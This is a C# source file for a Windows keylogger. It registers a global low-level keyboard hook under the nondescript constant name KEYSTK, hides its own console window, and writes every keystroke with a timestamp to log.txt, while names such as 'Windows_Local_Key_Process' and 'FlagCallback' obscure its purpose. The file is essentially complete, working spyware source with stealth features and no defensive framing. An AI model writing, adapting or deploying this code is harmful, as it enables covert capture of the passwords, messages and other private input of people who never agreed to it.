// Miguel Pulido - Systems Architect

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Text.RegularExpressions;


namespace Windows_Local_Key_Process
{
    class Program
    {
        private const int KEYSTK = 13;
        private const int KEYSTK_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = FlagCallback;
        private static IntPtr _flagID = IntPtr.Zero;

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);

            _flagID = SetFlag(_proc);
            Application.Run();
            UnhookWindowsHookEx(_flagID);
        }

        private static IntPtr SetFlag(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(KEYSTK, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr FlagCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)KEYSTK_KEYDOWN)
            {
                
             /*
                //Setup RegEx Character 
               // Define a regular expression for repeated words.
                Regex rx = new Regex(@"\b(?<word>\w+)\s+(\k<word>)\b",
                RegexOptions.Compiled | RegexOptions.IgnoreCase);
                // Find matches.
                MatchCollection matches = rx.Matches(Keys);
               */ 

                //logging piece
                int migsCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)migsCode);
                Console.WriteLine();
                Console.Write(System.Environment.NewLine);
                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                sw.WriteLine(DateTime.Now); // Add date/time 
                sw.Write((Keys)migsCode);
                sw.Close();
            
            
            
            }
            return CallNextHookEx(_flagID, nCode, wParam, lParam);
        }
        //These Dll's that will handle the hooks

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // The two dll imports below will handle the window hiding

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

    }
}